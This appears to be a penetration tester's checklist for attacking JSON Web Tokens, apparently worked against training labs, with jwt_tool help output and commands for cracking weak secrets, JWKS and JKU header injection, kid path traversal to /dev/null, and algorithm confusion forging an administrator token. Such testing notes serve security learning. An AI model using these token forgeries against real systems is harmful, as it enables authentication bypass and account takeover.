# Methodology

[Attack Methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)

<details>
	<summary>jwt_tool menu</summary>
➜ jwt_tool --help
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
usage: jwt_tool.py [-h] [-b] [-t TARGETURL] [-r REQUEST] [-rt RATE] [-i]
				   [-rc COOKIES] [-rh HEADERS] [-pd POSTDATA]
				   [-cv CANARYVALUE] [-np] [-nr] [-M MODE] [-X EXPLOIT]
				   [-ju JWKSURL] [-S SIGN] [-pr PRIVKEY] [-T] [-I]
				   [-hc HEADERCLAIM] [-pc PAYLOADCLAIM] [-hv HEADERVALUE]
				   [-pv PAYLOADVALUE] [-C] [-d DICT] [-p PASSWORD]
				   [-kf KEYFILE] [-V] [-pk PUBKEY] [-jw JWKSFILE] [-Q QUERY]
				   [-v]
				   [jwt]

positional arguments:
  jwt                   the JWT to tinker with (no need to specify if in header/cookies)

optional arguments:
  -h, --help            show this help message and exit
  -b, --bare            return TOKENS ONLY
  -t TARGETURL, --targeturl TARGETURL
						URL to send HTTP request to with new JWT
  -r REQUEST, --request REQUEST
						URL request to base on
  -rt RATE, --rate RATE
						Max. number of requests per minute
  -i, --insecure        Use HTTP for passed request
  -rc COOKIES, --cookies COOKIES
						request cookies to send with the forged HTTP request
  -rh HEADERS, --headers HEADERS
						request headers to send with the forged HTTP request (can be used multiple times for additional headers)
  -pd POSTDATA, --postdata POSTDATA
						text string that contains all the data to be sent in a POST request
  -cv CANARYVALUE, --canaryvalue CANARYVALUE
						text string that appears in response for valid token (e.g. "Welcome, ticarpi")
  -np, --noproxy        disable proxy for current request (change in jwtconf.ini if permanent)
  -nr, --noredir        disable redirects for current request (change in jwtconf.ini if permanent)
  -M MODE, --mode MODE  Scanning mode:
						pb = playbook audit
						er = fuzz existing claims to force errors
						cc = fuzz common claims
						at - All Tests!
  -X EXPLOIT, --exploit EXPLOIT
						eXploit known vulnerabilities:
						a = alg:none
						n = null signature
						b = blank password accepted in signature
						p = 'psychic signature' accepted in ECDSA signing
						s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)
						k = key confusion (specify public key with -pk)
						i = inject inline JWKS
  -ju JWKSURL, --jwksurl JWKSURL
						URL location where you can host a spoofed JWKS
  -S SIGN, --sign SIGN  sign the resulting token:
						hs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)
						rs256/rs384/rs512 = RSA signing (specify an RSA private key with -pr)
						es256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)
						ps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)
  -pr PRIVKEY, --privkey PRIVKEY
						Private Key for Asymmetric crypto
  -T, --tamper          tamper with the JWT contents
						(set signing options with -S or use exploits with -X)
  -I, --injectclaims    inject new claims and update existing claims with new values
						(set signing options with -S or use exploits with -X)
						(set target claim with -hc/-pc and injection values/lists with -hv/-pv
  -hc HEADERCLAIM, --headerclaim HEADERCLAIM
						Header claim to tamper with
  -pc PAYLOADCLAIM, --payloadclaim PAYLOADCLAIM
						Payload claim to tamper with
  -hv HEADERVALUE, --headervalue HEADERVALUE
						Value (or file containing values) to inject into tampered header claim
  -pv PAYLOADVALUE, --payloadvalue PAYLOADVALUE
						Value (or file containing values) to inject into tampered payload claim
  -C, --crack           crack key for an HMAC-SHA token
						(specify -d/-p/-kf)
  -d DICT, --dict DICT  dictionary file for cracking
  -p PASSWORD, --password PASSWORD
						password for cracking
  -kf KEYFILE, --keyfile KEYFILE
						keyfile for cracking (when signed with 'kid' attacks)
  -V, --verify          verify the RSA signature against a Public Key
						(specify -pk/-jw)
  -pk PUBKEY, --pubkey PUBKEY
						Public Key for Asymmetric crypto
  -jw JWKSFILE, --jwksfile JWKSFILE
						JSON Web Key Store for Asymmetric crypto
  -Q QUERY, --query QUERY
						Query a token ID against the logfile to see the details of that request
						e.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a
  -v, --verbose         When parsing and printing, produce (slightly more) verbose output.

If you don't have a token, try this one:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po
</details>

# Checks

- [ ] Does the server validate the signature?
- [ ] Does it accept ‘none’ algorithm?
- [ ] Is the JWT using a weak secret?

```bash
jwt_tool eyJraWQiOiIyNmRhODE1Yy04MmNjLTQxZjYtYWVmOS00ZDQ4OTkzYTAwZTYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDg5NzY0Nywic3ViIjoid2llbmVyIn0.ijIEqkAYKBnzXdVj0jpYfos_I5nvCye8S_oEwxKE76k -T -S hs256 -p secret1
```

- [ ] Can we inject a custom JWKS into the header?

```bash
jwt_tool <JWT> -T -X i
```

- [ ] Can we specify a JWKS URL (JKU Header injection)?

```
jwt_tool eyJraWQiOiJkYjQwZjczYy00MWUwLTRhOGMtOGM0NS0zYWZkNTFkYTQwOTciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDg5ODc1Miwic3ViIjoid2llbmVyIn0.L9z8fOlY3anLswREEyJjHFLSIq8_fAM28KLKlMiftbycEDoqwzeu8heGlhgXo3wr4gdxXF9dsCgJXb4OkX8uU2ENaPSKQ5gWVQlFWJH3DZPdOvA0HaXxqgE_8U7BI6e01U0u9yRweqaU2X2Mf7o5wVe01Ra0ds7Vlx7zfheHsg7IoKPgW04EmkVg_dN62stsx_0HbTLn68JYifArVYaQfGrr3no2vy2ICB0W2h2qDRi3LKWmEblCT5RdRoaAkLjuj7P4jLupOtO0TGXzIQSN9ubUJ0u5swwzJYk5sPAq3y5HSmh-wCGQtBFBB9a4lpIaa3W2lhGe4gGLSx5Mnl2sGQ -T -X s -ju <https://exploit-0a0a009003177e2d814c513b01830014.exploit-server.net>
```

```
{
	"keys":[
		{
			"kty":"RSA",
			"kid":"jwt_tool",
			"use":"sig",
			"e":"AQAB",
			"n":"u5v3ewc1wc3N5-vUsjYDDCEJX5NxPZ_BnhvV6xQe3PRV_5jLkJit6MaICSIA83T0nhUBlhehLhouewBIzextH0v6ZNeHbAVC7viRzBggiproufl-nyoY-CrgAfNxFFQuBErVcY0MK8A73B6zzO-exEoGFj8Rlh1YZfT3B4xrXGZn8H2CrAO22J6b1hC-0CHnFFSUd7RUdzHuamLd1xFABFGCbqWfI4Ifk9Mx7DNZi3nohEWFS1YgHhpkQpUcWE-L4Rn3KQe8qK4qncBQX8JvBJ1mbj-2XXw-nHfBYeREPjrOuhs60hbDcBrZzukqw9lhDeQI0uCXi6getPQtd66WtQ"
		}
	]
}
```

Make sure to modify the kid value in the JWT to `jwt_tool` if not using Burp.

- [ ] Check for kid header path traversal
    
Point to `/dev/null`

```
../../../../../../dev/null
```

Sign with an empty key
    
- [ ] Check for algorithm confusion
    
JWT
    
```
eyJraWQiOiI0OGYyYTNlOC1mYjM2LTRmNWYtYWI3MS1jOGQ0OTdhMTA5Y2IiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDkwMTIzNCwic3ViIjoid2llbmVyIn0.h8Sofd0dYynEhDm3V8vAB9IoTFlMjvrRj5RPk5mSlBo4IMse206D1x9VaNWEW_ukFw5yaR-x0t44B-Pygz4sBxJB9tU70MAFF0UGdW2BMlXG8Bs-e6CHXtUUuqNo_557PfwudsLKG1AWe6eToE5cxtX_dX2UY1-yUgea1SYsYl0v6m8E5DjP4nzGkf_k4XHNhk84qyoamtMP2r0ug-7-9Jax8MweQGf3znDjFqKrss7xAXgKxkql3CklEo4f0BX6OTygi7cQm_pT1mS4MZBmdQMmYilGBKfw85yqtPaieyOrrYj779vEyNqKv-_tvq1EIqFdU6ooGEcrCRpubx8nug
```

Public key from jwks.json

```
{
	"keys": [{
		"kty": "RSA",
		"e": "AQAB",
		"use": "sig",
		"kid": "48f2a3e8-fb36-4f5f-ab71-c8d497a109cb",
		"alg": "RS256",
		"n": "qZmx7wBp2e48v20Z-yvJPJO8XAeSASQjP6npNIxheXsB2qrm1IqPp7YTF_qHj54czS2jB1OHvjKXu-QW84gnXTFe2xHhp3HcEcMFc_oTFHy67ULQp6hZQ9NHYKeTY1DcjlmER1YzSJU9D-JgLkS62HtQyKxnzjWtAbZsNNZq5xEToANRqSu0_apNwWC2C965eEOdzV7tU8fndiUJYhiNohRWiE3OI0Lva7H36pNFbyimxiDBAkVWuH7wn8bVUtw_pZu1h-VMBZ_ZO-Uh4k6csAj4hUISh249gGBQT8GO6rwVcNhyzLA6RwIqOglQFBy4Ef1yxkCjoxM3RHXjet1FIQ"
	}]
}
```

Use `jwker` to convert the jwk into pem format:

```
jwker mykey.jwk mykey.pem
```

Then use `jwt_tool` to forge the new token:

```
jwt_tool eyJraWQiOiJlZTFkODVlOC04NzBmLTRkZmQtOTQ1My0yNjhjMzdkNjY4MWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NDk3NTY0NCwic3ViIjoid2llbmVyIn0.AACNevR8eiZPcV6QIJGVncP-OPUyeAqwQwiFx2LqyaiGJT-N0sNsDHdbL5YzcoQXqROlZlLX6qAQcDm4n-rPfwc4coWWwyOIyc0hx_IcssffoNOlIzBOY3XWMbEyVpPAa2viFXwasSHJDXIy9aJTtwOohzUEPG0mF99EngWKTmeRrq9AftWts5pM9PujjZRlpDfy9FQywOlThhJwLmTYIY_IWy3Jt82T9MErRbbOTn1VSGGjlLV4BQF-3Du8SX0duuIX2zuIe2npt4dHSEhK7tZWD79HvHGHSYY7fkyFaJv9pxtxgg2HWWTvehVbDsoIiJAaAp4HZ5HlAy72Ory16w -I -pc sub -pv administrator -X k -pk /root/.jwt_tool/mykey.pem
```